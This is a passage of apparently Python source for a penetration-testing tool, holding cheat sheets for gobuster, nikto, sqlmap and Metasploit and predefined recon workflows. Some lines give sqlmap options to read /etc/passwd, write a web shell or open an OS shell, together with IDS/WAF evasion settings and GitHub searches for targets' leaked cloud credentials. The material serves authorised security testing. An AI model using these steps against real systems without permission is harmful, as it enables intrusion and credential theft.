🏠 VHOST MODE (vhost)
────────────────────────────────────────────────────────────
gobuster vhost -u https://example.com -w wordlist.txt

Options:
-u, --url <URL>                 # Base URL
-w, --wordlist <FILE>           # Vhost wordlist
-t, --threads <NUM>             # Threads
-k, --no-tls-validation        # Skip SSL verification

📁 COMMON WORDLISTS
────────────────────────────────────────────────────────────
# Directories
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt

# DNS/Subdomains
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/namelist.txt

🔍 FILE EXTENSIONS
────────────────────────────────────────────────────────────
-x php                          # Single extension
-x php,html,txt                 # Multiple extensions
-x php,asp,aspx,jsp             # Server-side scripts
-x bak,old,zip,tar.gz           # Backups
-x txt,pdf,doc,docx             # Documents

⚡ PERFORMANCE OPTIONS
────────────────────────────────────────────────────────────
-t 50                           # Increase threads
-t 10                           # Default threads
--delay 100ms                   # Delay between requests
--timeout 10s                   # Request timeout
--no-progress                   # Disable progress bar

🎯 STATUS CODE FILTERING
────────────────────────────────────────────────────────────
-b 404                          # Exclude 404
-b 404,403                      # Exclude multiple
-s 200,301,302                  # Include specific codes

🔐 AUTHENTICATION
────────────────────────────────────────────────────────────
-U <username>                   # HTTP auth username
-P <password>                   # HTTP auth password
-c <cookie>                     # Cookie header
-H "Name: Value"                # Custom header

💡 COMMON PATTERNS
────────────────────────────────────────────────────────────
# Basic directory scan
gobuster dir -u http://example.com -w common.txt

# With extensions
gobuster dir -u http://example.com -w common.txt -x php,html,txt

# Skip SSL errors
gobuster dir -u https://example.com -w common.txt -k

# Subdomain enumeration
gobuster dns -d example.com -w subdomains.txt

# Virtual hosts
gobuster vhost -u http://example.com -w vhosts.txt

# Exclude 404s and 403s
gobuster dir -u http://example.com -w common.txt -b 404,403

# High thread count
gobuster dir -u http://example.com -w big.txt -t 50

📊 INTERPRETING RESULTS
────────────────────────────────────────────────────────────
Status: 200                     # Found, accessible
Status: 301                     # Redirect (follow it!)
Status: 302                     # Temporary redirect
Status: 401                     # Authentication required
Status: 403                     # Forbidden (exists!)
Status: 500                     # Server error

💾 OUTPUT OPTIONS
────────────────────────────────────────────────────────────
-o output.txt                   # Save results
-q                              # Quiet (errors only)
-v                              # Verbose output
--no-progress                   # No progress bar

⚙️ ADVANCED OPTIONS
────────────────────────────────────────────────────────────
-a, --useragent <UA>           # Custom user agent
-r, --follow-redirect           # Follow redirects
-e, --expanded                  # Expanded output
-m, --method <METHOD>          # HTTP method (GET/POST)
-p, --proxy <URL>              # Proxy URL
-P, --password <PASS>          # HTTP auth password

🎨 USEFUL COMBINATIONS
────────────────────────────────────────────────────────────
# Full web scan
gobuster dir -u https://example.com -w big.txt -x php,html,js,txt -t 50 -k

# Quick common check
gobuster dir -u http://example.com -w common.txt -b 404

# API endpoint discovery
gobuster dir -u http://api.example.com -w api-endpoints.txt -b 404

# Subdomain discovery
gobuster dns -d example.com -w subdomains-10000.txt -t 50

⚠️ BEST PRACTICES
────────────────────────────────────────────────────────────
• Start with small wordlists
• Exclude 404s to reduce noise
• Use appropriate thread count
• Check robots.txt first
• Monitor server load
• Save results to file
• Use -k for self-signed certs

📈 WORDLIST RECOMMENDATIONS
────────────────────────────────────────────────────────────
Quick (1-2 min):
→ common.txt (~4500 words)

Medium (5-15 min):
→ directory-list-2.3-medium.txt (~220k words)

Deep (hours):
→ directory-list-2.3-big.txt (~1.2M words)

🚀 PERFORMANCE TIPS
────────────────────────────────────────────────────────────
• Increase threads for faster scans
• Use smaller wordlists first
• Filter out known false positives
• Run during off-hours if possible
• Check for rate limiting
""",
            "nikto": """
NIKTO CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC USAGE
────────────────────────────────────────────────────────────
nikto -h http://example.com     # Basic scan
nikto -h example.com -p 80      # Specify port
nikto -h example.com -ssl       # HTTPS scan

🎯 ESSENTIAL OPTIONS
────────────────────────────────────────────────────────────
-h <host>                       # Target host/URL
-p <port>                       # Port number
-ssl                            # Force SSL
-T <tuning>                     # Scan tuning
-C <checks>                     # Check types

🔐 SSL/HTTPS
────────────────────────────────────────────────────────────
-ssl                            # Use HTTPS
-p 443                          # HTTPS port
nikto -h example.com -ssl -p 443  # Full HTTPS scan

⚙️ SCAN TUNING (-T Option)
────────────────────────────────────────────────────────────
0                               # File upload
1                               # Interesting files
2                               # Misconfiguration
3                               # Information disclosure
4                               # Injection (XSS/Script/HTML)
5                               # Remote file retrieval
6                               # Denial of service
7                               # Remote file retrieval (inside web root)
8                               # Command execution
9                               # SQL injection
a                               # Authentication bypass
b                               # Software identification
c                               # Remote source inclusion
x                               # Reverse tuning (all except specified)

Multiple: -T 124                # Tests 1, 2, and 4
All: -T x                       # All tests

🎨 COMMON SCAN TYPES
────────────────────────────────────────────────────────────
# Quick scan (common vulns)
nikto -h http://example.com -T 1234

# Comprehensive scan (all tests)
nikto -h http://example.com -T x

# Injection testing
nikto -h http://example.com -T 4689

# Information gathering only
nikto -h http://example.com -T 13

# SSL/TLS vulnerabilities
nikto -h example.com -ssl -p 443

💡 AUTHENTICATION
────────────────────────────────────────────────────────────
-id <user:pass>                 # HTTP basic auth
-C <cookie>                     # Cookie
Example:
nikto -h http://example.com -id admin:password

📊 EVASION & PERFORMANCE
────────────────────────────────────────────────────────────
-Pause <seconds>                # Pause between tests
-timeout <seconds>              # Request timeout
-maxtime                        # Maximum scan time
-useragent <string>             # Custom user agent
-evasion <techniques>           # IDS evasion

Evasion Techniques:
1                               # Random URL encoding
2                               # Directory self-reference (/./  )
3                               # Premature URL ending
4                               # Prepend long random string
5                               # Fake parameter
6                               # TAB as request spacer
7                               # Change case in URL
8                               # Windows directory separator (\\\\)

💾 OUTPUT OPTIONS
────────────────────────────────────────────────────────────
-o <file>                       # Output file
-Format <format>                # Output format

Formats:
csv                             # CSV format
htm                             # HTML format
txt                             # Text format (default)
xml                             # XML format

Example:
nikto -h example.com -o scan.html -Format htm

🔍 SPECIFIC CHECKS
────────────────────────────────────────────────────────────
-Cgidirs <dirs>                 # CGI directories to scan
-dbcheck                        # Check database file
-list-plugins                   # List available plugins
-Plugins <plugins>              # Specify plugins

📋 COMMON FINDINGS
────────────────────────────────────────────────────────────
• Default files and directories
• Insecure files
• Server misconfigurations
• Outdated server software
• Dangerous HTTP methods
• XSS vulnerabilities
• SQL injection points
• Directory listings
• Backup files
• Server information leakage

⚠️ UNDERSTANDING OUTPUT
────────────────────────────────────────────────────────────
+ OSVDB-xxx                     # Vulnerability ID
- Nikto  v2.x.x                 # Version info
+ Server: Apache/2.4.x          # Server ID
+ Allowed HTTP Methods          # Available methods
+ OSVDB-xxx: file.php           # Vulnerable file

Risk Indicators:
+                               # Finding
+ OSVDB                         # Verified vulnerability
+ Retrieved                     # Retrieved sensitive info

💡 PRACTICAL EXAMPLES
────────────────────────────────────────────────────────────
# Basic web server scan
nikto -h http://example.com

# HTTPS scan on custom port
nikto -h example.com -ssl -p 8443

# Comprehensive vulnerability scan
nikto -h http://example.com -T x -o full_scan.html -Format htm

# Authenticated scan
nikto -h http://example.com -id user:password -T x

# Slow, stealthy scan
nikto -h http://example.com -Pause 5 -evasion 1247

# Quick common vulnerability check
nikto -h http://example.com -T 1249

# Multiple hosts from file
nikto -h hosts.txt -o results.txt

🎯 SCAN STRATEGY
────────────────────────────────────────────────────────────
1. Quick scan first (-T 124)
2. Review findings
3. Deep scan on interesting findings
4 Full scan if time permits (-T x)
5. Save and document results

⚡ PERFORMANCE TUNING
────────────────────────────────────────────────────────────
• Nikto is thorough but slow
• Use -Pause to reduce load
• Consider -maxtime for time limits
• Scan non-peak hours
• Target specific tests when possible
• Save results for review later

🚨 DETECTION & LOGS
────────────────────────────────────────────────────────────
⚠️ Nikto is LOUD and easily detected
• Creates many log entries
• IDS/IPS will likely alert
• WAFs may block requests
• Not suitable for stealth
• Best for authorized testing

💡 TIPS
────────────────────────────────────────────────────────────
• Always save output (-o)
• Use HTML format for reports
• Review robots.txt first
• Check for WAF/IDS
• Scan from trusted IP if possible
• Verify findings manually
• Many false positives possible
• Cross-reference with other tools

🔒 LIMITATIONS
────────────────────────────────────────────────────────────
• Signature-based (needs updates)
• Can't detect all vulnerabilities
• Many false positives
• Slow on large sites
• Easily detected
• Limited authentication support
• No JavaScript execution
""",
            "sqlmap": """
SQLMAP CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC USAGE
────────────────────────────────────────────────────────────
sqlmap -u "URL?param=value"           # Test single parameter
sqlmap -u "URL" --forms               # Auto-detect forms
sqlmap -u "URL" --crawl=3             # Crawl and test (depth 3)
sqlmap -r request.txt                 # From Burp/ZAP request file

🎯 TARGET SPECIFICATION
────────────────────────────────────────────────────────────
-u URL                                # Target URL with parameters
-d "mysql://user:pass@host:port/db"   # Direct database connection
-l logfile                            # Parse from Burp proxy log
-r request.txt                        # Load HTTP request from file
-g "inurl:php?id="                    # Google dork results
--data="param=value"                  # POST data
--cookie="COOKIE"                     # HTTP Cookie header
--headers="Header: value"             # Extra headers

🔍 DETECTION LEVELS
────────────────────────────────────────────────────────────
--level=1                             # Default (limited tests)
--level=2                             # Cookie testing
--level=3                             # User-Agent/Referer testing
--level=4                             # More payloads
--level=5                             # Maximum (slow but thorough)

--risk=1                              # Default (safe tests only)
--risk=2                              # Time-based tests
--risk=3                              # OR-based tests (may modify data)

⚙️ INJECTION TECHNIQUES
────────────────────────────────────────────────────────────
--technique=BEUSTQ                    # Techniques to test
  B = Boolean-based blind
  E = Error-based
  U = UNION query-based
  S = Stacked queries
  T = Time-based blind
  Q = Inline queries

📊 ENUMERATION
────────────────────────────────────────────────────────────
-b, --banner                          # Database banner
--current-user                        # Current DB user
--current-db                          # Current database
--is-dba                              # Is current user DBA?
--users                               # Enumerate users
--passwords                           # Enumerate password hashes
--privileges                          # Enumerate privileges
--dbs                                 # Enumerate databases
-D DB --tables                        # Tables in database
-D DB -T TBL --columns                # Columns in table
-D DB -T TBL --dump                   # Dump table contents
--dump-all                            # Dump everything

🛡️ BYPASS TECHNIQUES
────────────────────────────────────────────────────────────
--tamper=SCRIPT                       # Use tamper script(s)
  space2comment                       # Replace spaces with /**/
  randomcase                          # Random case keywords
  between                             # Use BETWEEN instead of >
  charencode                          # URL-encode characters
  equaltolike                         # Replace = with LIKE
  base64encode                        # Base64 encode payload

--random-agent                        # Random User-Agent
--delay=SECONDS                       # Delay between requests
--timeout=SECONDS                     # Request timeout
--retries=NUM                         # Retries on timeout

🔐 AUTHENTICATION
────────────────────────────────────────────────────────────
--auth-type=TYPE                      # HTTP auth type (Basic/Digest/NTLM)
--auth-cred="user:pass"               # HTTP auth credentials
--csrf-token=TOKEN                    # CSRF token parameter name
--csrf-url=URL                        # URL to get CSRF token

📁 FILE OPERATIONS (if permitted)
────────────────────────────────────────────────────────────
--file-read="/etc/passwd"             # Read file from server
--file-write="local.txt"              # Write file to server
--file-dest="/var/www/shell.php"      # Destination path

💻 OS COMMAND EXECUTION (if permitted)
────────────────────────────────────────────────────────────
--os-cmd=COMMAND                      # Execute OS command
--os-shell                            # Interactive OS shell
--os-pwn                              # OOB shell/meterpreter

⚡ OPTIMIZATION
────────────────────────────────────────────────────────────
--batch                               # Never ask for user input
--smart                               # Thorough only if positive
--threads=THREADS                     # Concurrent connections (1-10)
-o                                    # Turn on all optimization
--predict-output                      # Predict query output
--keep-alive                          # Use persistent connections

📄 OUTPUT OPTIONS
────────────────────────────────────────────────────────────
-v LEVEL                              # Verbosity (0-6)
--output-dir=PATH                     # Custom output directory
--save=FILE                           # Save options to INI file
--flush-session                       # Flush session files
--forms                               # Parse and test forms

🎭 COMMON PRESETS
────────────────────────────────────────────────────────────
# Quick test
sqlmap -u "URL" --batch --smart

# Full assessment
sqlmap -u "URL" --batch --level=5 --risk=3 --forms

# Database enumeration
sqlmap -u "URL" --batch --dbs --level=3

# Dump specific table
sqlmap -u "URL" -D database -T table --dump --batch

# Bypass WAF
sqlmap -u "URL" --tamper=space2comment,randomcase --random-agent

🚨 IMPORTANT NOTES
────────────────────────────────────────────────────────────
⚠️ ALWAYS use --batch for automated testing
⚠️ High risk levels may MODIFY data
⚠️ --dump can be VERY slow on large tables
⚠️ Use --threads carefully (max 10 recommended)
⚠️ ONLY test systems you have permission to test
⚠️ SQLi can cause data loss - be careful with risk=3

💡 TIPS
────────────────────────────────────────────────────────────
• Start with --level=1 --risk=1, increase if needed
• Use --batch for non-interactive operation
• Save requests from Burp/ZAP for complex auth
• Check robots.txt for hidden parameters
• Test POST parameters with --data
• Use --tamper scripts against WAFs
• Document findings immediately
""",
            "metasploit": """
METASPLOIT FRAMEWORK CHEAT SHEET
═══════════════════════════════════════════════════════════

🔍 AUXILIARY/SCANNER MODULES (RECON ONLY)
────────────────────────────────────────────────────────────
⚠️ This tool ONLY allows auxiliary/scanner modules
⚠️ Exploitation modules are BLOCKED for safety

📋 PORT SCANNERS
────────────────────────────────────────────────────────────
auxiliary/scanner/portscan/tcp
- Standard TCP port scanner
- Options: RHOSTS, PORTS, THREADS

auxiliary/scanner/portscan/syn
- SYN scan (faster, stealthier)
- Requires root/sudo
- Options: RHOSTS, INTERFACE, PORTS

auxiliary/scanner/portscan/ack
- ACK scan for firewall detection
- Options: RHOSTS, PORTS

🌐 SERVICE DETECTION
────────────────────────────────────────────────────────────
auxiliary/scanner/http/http_version
- Detect HTTP server version
- Options: RHOSTS, RPORT (default 80)

auxiliary/scanner/ssh/ssh_version
- SSH banner grabbing
- Options: RHOSTS, RPORT (default 22)

auxiliary/scanner/smb/smb_version
- SMB version detection
- Options: RHOSTS

auxiliary/scanner/ftp/ftp_version
- FTP server detection
- Options: RHOSTS

auxiliary/scanner/mysql/mysql_version
- MySQL version detection
- Options: RHOSTS

auxiliary/scanner/postgres/postgres_version
- PostgreSQL version detection
- Options: RHOSTS

📁 SMB ENUMERATION
────────────────────────────────────────────────────────────
auxiliary/scanner/smb/smb_enumshares
- Enumerate SMB shares
- Options: RHOSTS, SMBUser, SMBPass

auxiliary/scanner/smb/smb_enumusers
- Enumerate SMB users
- Options: RHOSTS

auxiliary/scanner/smb/smb_login
- SMB authentication testing
- Options: RHOSTS, SMBUser, SMBPass

🔐 SSH ENUMERATION
────────────────────────────────────────────────────────────
auxiliary/scanner/ssh/ssh_login
- SSH login attempts
- Options: RHOSTS, USERNAME, PASSWORD

auxiliary/scanner/ssh/ssh_enumusers
- SSH user enumeration
- Options: RHOSTS, USER_FILE

🌩️ SNMP ENUMERATION
────────────────────────────────────────────────────────────
auxiliary/scanner/snmp/snmp_enum
- SNMP enumeration
- Options: RHOSTS

auxiliary/scanner/snmp/snmp_login
- SNMP community string testing
- Options: RHOSTS

⚙️ COMMON OPTIONS
────────────────────────────────────────────────────────────
RHOSTS                          # Target IP/hostname
RPORT                           # Target port
THREADS                         # Thread count (default 10)
SMBUser                         # SMB username
SMBPass                         # SMB password
USERNAME                        # Generic username
PASSWORD                        # Generic password
USER_FILE                       # Username wordlist
PASS_FILE                       # Password wordlist

💡 USAGE EXAMPLES
────────────────────────────────────────────────────────────
Module: auxiliary/scanner/portscan/tcp
RHOSTS: 192.168.1.100
PORTS: 1-1000
THREADS: 20

Module: auxiliary/scanner/smb/smb_version
RHOSTS: 192.168.1.0/24
THREADS: 10

Module: auxiliary/scanner/http/http_version
RHOSTS: example.com
RPORT: 8080

📊 INTERPRETING RESULTS
────────────────────────────────────────────────────────────
[+]                             # Success/finding
[-]                             # Failure/no result
[*]                             # Information
[!]                             # Warning/error

🎯 RECOMMENDED MODULES
────────────────────────────────────────────────────────────
Network Discovery:
→ auxiliary/scanner/portscan/tcp

Web Servers:
→ auxiliary/scanner/http/http_version
→ auxiliary/scanner/http/robots_txt

Windows/SMB:
→ auxiliary/scanner/smb/smb_version
→ auxiliary/scanner/smb/smb_enumshares

SSH Systems:
→ auxiliary/scanner/ssh/ssh_version
→ auxiliary/scanner/ssh/ssh_login

Databases:
→ auxiliary/scanner/mysql/mysql_version
→ auxiliary/scanner/postgres/postgres_version

⚡ PERFORMANCE TIPS
────────────────────────────────────────────────────────────
• Adjust THREADS based on network
• Start with 10 threads, increase if needed
• Use specific PORTS to speed up scans
• Target specific services when known
• Save results from console output

🔒 SECURITY NOTES
────────────────────────────────────────────────────────────
✅ Only reconnaissance modules allowed
✅ No exploitation capabilities
✅ Module paths validated
✅ Input sanitization enforced

❌ Exploit modules BLOCKED
❌ Payload generation BLOCKED
❌ Post-exploitation BLOCKED

💾 MODULE CATEGORIES
────────────────────────────────────────────────────────────
auxiliary/scanner/               # Scanners (allowed)
auxiliary/gather/                # Info gathering (allowed)
exploit/                         # BLOCKED
post/                           # BLOCKED
payload/                        # BLOCKED

📚 ADDITIONAL RESOURCES
────────────────────────────────────────────────────────────
• Metasploit Unleashed: offensive-security.com
• Module documentation: metasploit.com
• Community modules: github.com/rapid7/metasploit-framework

⚠️ LEGAL REMINDER
────────────────────────────────────────────────────────────
• Only scan authorized systems
• Active scanning can be detected
• May trigger IDS/IPS alerts
• Document all activities
• Get written permission first
""",
            "workflows": """
WORKFLOWS CHEAT SHEET
═══════════════════════════════════════════════════════════

📋 BASIC WORKFLOWS
────────────────────────────────────────────────────────────
1. 🎯 Full Network Reconnaissance
   Steps: Nmap → Gobuster → Nikto → DNSrecon
   Best for: Unknown networks, initial assessment

2. 🌐 Web Application Deep Scan
   Steps: Nikto → Gobuster → feroxbuster → Shodan
   Best for: Web applications, API endpoints

3. 📡 Domain Intelligence Gathering
   Steps: DNSrecon (std + brt) → Shodan → GitHarvester
   Best for: Domain reconnaissance, OSINT

4. 🖥️ Windows/SMB Enumeration
   Steps: Nmap (SMB) → enum4linux → Metasploit
   Best for: Windows hosts, Active Directory

5. ☁️ Cloud Asset Discovery
   Steps: AWSBucketDump → GitHarvester → Shodan
   Best for: Cloud security assessment

6. ⚡ Quick Host Discovery
   Steps: Nmap (fast) → Nikto (quick)
   Best for: Fast initial reconnaissance

🔥 ADVANCED ATTACK WORKFLOWS
────────────────────────────────────────────────────────────
7. 🏢 Active Directory Reconnaissance
   Steps: Nmap (AD ports) → enum4linux → MSF LDAP → Kerberos
   Best for: AD pentesting, domain enumeration

8. 🌍 Web Application Pentesting
   Steps: Nmap → Nikto → Gobuster → feroxbuster → Vhost → SQLmap
   Best for: Complete web app assessment

9. 🔴 External Perimeter Assessment
   Steps: DNS → Subdomain → Shodan → Nmap → GitHarvester
   Best for: Red team external recon

10. 🔄 Internal Network Sweep
    Steps: Host Discovery → Service Enum → Windows → MSF
    Best for: Internal network pentesting

11. 🔌 API Security Assessment
    Steps: Nmap → Gobuster (API) → feroxbuster → Nikto
    Best for: REST API security testing

12. 🔑 Credential Hunting
    Steps: GitHarvester → Shodan → Nmap → MSF FTP
    Best for: Finding exposed credentials

13. 🔒 SSL/TLS Assessment
    Steps: Nmap (SSL scripts) → Nikto HTTPS → Shodan
    Best for: Certificate and encryption testing

14. 📊 Network Services Audit
    Steps: Full Port Scan → Version Detection → Nikto → SMB → SSH
    Best for: Comprehensive service enumeration

15. 🥷 Stealth Reconnaissance
    Steps: Slow Nmap → DNS → Shodan → GitHub
    Best for: Evading detection (T1 timing)

16. 📦 Full Stack Assessment
    Steps: DNS → Nmap → Nikto → Gobuster → enum4linux → Shodan → Git
    Best for: Complete infrastructure assessment

17. 🔓 Vulnerability Assessment
    Steps: Nmap (vuln) → Nikto → MSF SMB → Shodan
    Best for: Comprehensive vuln scanning

18. 🗄️ Database Discovery
    Steps: Nmap (DB ports) → MySQL → MSSQL → Shodan
    Best for: Finding database services

19. 📧 Mail Server Reconnaissance
    Steps: DNS MX → Nmap (mail) → SMTP Enum → Shodan
    Best for: Email infrastructure enumeration

20. 💉 SQL Injection Assessment
    Steps: Nmap → Nikto → Gobuster → SQLmap
    Best for: SQL injection testing and database enumeration

🎯 TARGET FORMATS
────────────────────────────────────────────────────────────
IP Address:       192.168.1.1
Network Range:    192.168.1.0/24
Domain:           example.com
URL:              http://example.com
Hostname:         server.local

🔄 WORKFLOW EXECUTION
────────────────────────────────────────────────────────────
• Steps run sequentially
• Conditional steps depend on previous results
• HTTP detection enables web-based steps
• Each step has individual timeout (30 min)
• Total workflow timeout: 2 hours

📊 PROGRESS TRACKING
────────────────────────────────────────────────────────────
• Real-time step counter
• Progress bar percentage
• Elapsed time display
• Current tool indicator
• Results in console output

⏱️ TIMEOUTS
────────────────────────────────────────────────────────────
Per-step:    30 minutes
Total:       2 hours
Adjustable:  Yes (via Settings)

💡 TIPS
────────────────────────────────────────────────────────────
• Start with Quick Host Discovery
• Use Full Network Recon for thorough assessment
• Web scans work best on web servers
• Cloud scans need organization name
• Results auto-saved to console
• Export results with EXPORT button

⚙️ CUSTOMIZATION
────────────────────────────────────────────────────────────
• Timeouts: Settings → Process Timeout
• Threads: Settings → Default Threads
• Output: Settings → Output Directory

🔒 SECURITY
────────────────────────────────────────────────────────────
• All inputs validated
• Command injection prevented
• Process isolation
• Clean termination
• No shell=True

📤 EXPORT
────────────────────────────────────────────────────────────
• Text (.txt)
• JSON (.json)
• XML (.xml)
• HTML (.html)

⚠️ LEGAL REMINDER
────────────────────────────────────────────────────────────
• Only scan authorized systems
• Get written permission first
• Document all activities
"""
        }

        # Pre-defined Workflows for automation
        # Workflow modes explanation:
        # - passive_steps: No direct interaction with target (uses third-party data sources)
        # - active_steps: Direct interaction with target (sends packets/requests to target)
        self.predefined_workflows = {
            "full_recon": {
                "name": "Full Network Reconnaissance",
                "description": "Comprehensive scan: ports → services → web → DNS → SQLi",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Shodan Host Intelligence",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Shodan Org Search",
                        "config": {
                            "search_type": "search",
                            "query": "hostname:[TARGET_DOMAIN]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "GitHub OSINT",
                        "config": {
                            "query": "[TARGET_DOMAIN]",
                            "sort": "best"
                        }
                    },
                    {
                        "tool": "dnsrecon",
                        "name": "DNS Record Lookup",
                        "config": {
                            "scan_type": "std"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Comprehensive Port Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "1-65535",
                            "timing": "T4",
                            "scripts": "default,version,vuln"
                        }
                    },
                    {
                        "tool": "dnsrecon",
                        "name": "DNS Zone Transfer",
                        "config": {
                            "scan_type": "axfr"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "Directory Enumeration",
                        "config": {
                            "mode": "dir",
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                            "extensions": "php,asp,aspx,jsp,html,js,txt,bak",
                            "threads": "30"
                        },
                        "condition": "http_detected"
                    },
                    {
                        "tool": "nikto",
                        "name": "Web Vulnerability Scan",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "x"
                        },
                        "condition": "http_detected"
                    },
                    {
                        "tool": "sqlmap",
                        "name": "SQL Injection Scan",
                        "config": {
                            "level": "2",
                            "risk": "2",
                            "batch": True,
                            "forms": True,
                            "dbs": True
                        },
                        "condition": "http_detected"
                    }
                ]
            },
            "web_deep_scan": {
                "name": "Web Application Deep Scan",
                "description": "Comprehensive web application security assessment",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Shodan Web Service Intel",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "HTTP/HTTPS Service Search",
                        "config": {
                            "search_type": "search",
                            "query": "hostname:[TARGET_DOMAIN] port:80,443,8080"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Source Code Leak Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] config OR password OR api",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "Web Service Fingerprinting",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "80,443,8080,8443,8000,3000,5000,9000",
                            "timing": "T4",
                            "scripts": "http-enum,http-headers,http-methods,http-title,http-robots.txt,http-sitemap-generator"
                        }
                    },
                    {
                        "tool": "nikto",
                        "name": "Comprehensive Web Scan",
                        "config": {
                            "port": "80",
                            "ssl": False,
                            "tuning": "x"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "Directory Brute Force",
                        "config": {
                            "mode": "dir",
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt",
                            "extensions": "php,asp,aspx,jsp,html,js,txt,xml,json,bak,old,inc",
                            "threads": "40"
                        }
                    },
                    {
                        "tool": "feroxbuster",
                        "name": "Recursive Deep Scan",
                        "config": {
                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
                            "extensions": "php,html,js,json,xml,txt,bak,old,zip,tar,gz",
                            "threads": "50",
                            "depth": "4"
                        }
                    },
                    {
                        "tool": "sqlmap",
                        "name": "SQL Injection Testing",
                        "config": {
                            "level": "3",
                            "risk": "2",
                            "batch": True,
                            "forms": True,
                            "random_agent": True
                        }
                    }
                ]
            },
            "domain_intel": {
                "name": "Domain Intelligence Gathering",
                "description": "Comprehensive domain reconnaissance",
                "passive_steps": [
                    {
                        "tool": "dnsrecon",
                        "name": "DNS Record Lookup",
                        "config": {
                            "scan_type": "std"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Infrastructure Search",
                        "config": {
                            "search_type": "search",
                            "query": "hostname:[TARGET_DOMAIN]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "SSL Certificate Search",
                        "config": {
                            "search_type": "search",
                            "query": "ssl.cert.subject.cn:[TARGET_DOMAIN]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "GitHub Reference Search",
                        "config": {
                            "query": "[TARGET_DOMAIN]",
                            "sort": "best"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "GitHub Credential Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] password OR api_key OR secret",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "dnsrecon",
                        "name": "Subdomain Brute Force",
                        "config": {
                            "scan_type": "brt",
                            "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
                        }
                    },
                    {
                        "tool": "dnsrecon",
                        "name": "Zone Transfer Attempt",
                        "config": {
                            "scan_type": "axfr"
                        }
                    },
                    {
                        "tool": "gobuster",
                        "name": "DNS Subdomain Brute",
                        "config": {
                            "mode": "dns",
                            "wordlist": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                            "threads": "30"
                        }
                    },
                    {
                        "tool": "nmap",
                        "name": "Domain Host Discovery",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "80,443,21,22,25,53",
                            "timing": "T4"
                        }
                    }
                ]
            },
            "smb_enum": {
                "name": "Windows/SMB Enumeration",
                "description": "Comprehensive SMB/Windows enumeration with vuln checks",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Shodan SMB Search",
                        "config": {
                            "search_type": "search",
                            "query": "port:445 ip:[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "Windows Service Intel",
                        "config": {
                            "search_type": "host",
                            "query": "[TARGET_IP]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "AD/SMB Credential Search",
                        "config": {
                            "query": "[TARGET_DOMAIN] NTLM OR domain\\\\user OR administrator",
                            "sort": "new"
                        }
                    }
                ],
                "active_steps": [
                    {
                        "tool": "nmap",
                        "name": "SMB/Windows Service Scan",
                        "config": {
                            "scan_type": "SYN",
                            "ports": "21,22,23,25,53,80,88,111,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986",
                            "timing": "T4",
                            "scripts": "smb-os-discovery,smb-enum-shares,smb-enum-users,smb-protocols,smb-security-mode,smb-vuln-ms17-010,smb-vuln-ms08-067"
                        }
                    },
                    {
                        "tool": "enum4linux",
                        "name": "Full SMB Enumeration",
                        "config": {
                            "all_enum": True
                        }
                    },
                    {
                        "tool": "metasploit",
                        "name": "SMB Version Detection",
                        "config": {
                            "module": "auxiliary/scanner/smb/smb_version",
                            "threads": "10"
                        }
                    },
                    {
                        "tool": "metasploit",
                        "name": "SMB Share Enumeration",
                        "config": {
                            "module": "auxiliary/scanner/smb/smb_enumshares",
                            "threads": "10"
                        }
                    },
                    {
                        "tool": "metasploit",
                        "name": "MS17-010 EternalBlue Check",
                        "config": {
                            "module": "auxiliary/scanner/smb/smb_ms17_010",
                            "threads": "5"
                        }
                    }
                ]
            },
            "cloud_discovery": {
                "name": "Cloud Asset Discovery",
                "description": "S3 buckets → GitHub credentials → Infrastructure",
                "passive_steps": [
                    {
                        "tool": "shodan",
                        "name": "Cloud Organization Search",
                        "config": {
                            "search_type": "search",
                            "query": "org:[TARGET_ORG]"
                        }
                    },
                    {
                        "tool": "shodan",
                        "name": "AWS Infrastructure Search",
                        "config": {
                            "search_type": "search",
                            "query": "org:Amazon [TARGET_ORG]"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "AWS Credential Search",
                        "config": {
                            "query": "[TARGET_ORG] AWS_ACCESS_KEY OR AKIA",
                            "sort": "new"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "Azure Credential Search",
                        "config": {
                            "query": "[TARGET_ORG] AZURE_CLIENT_SECRET OR azure",
                            "sort": "new"
                        }
                    },
                    {
                        "tool": "githarvester",
                        "name": "GCP Credential Search",
                        "config": {
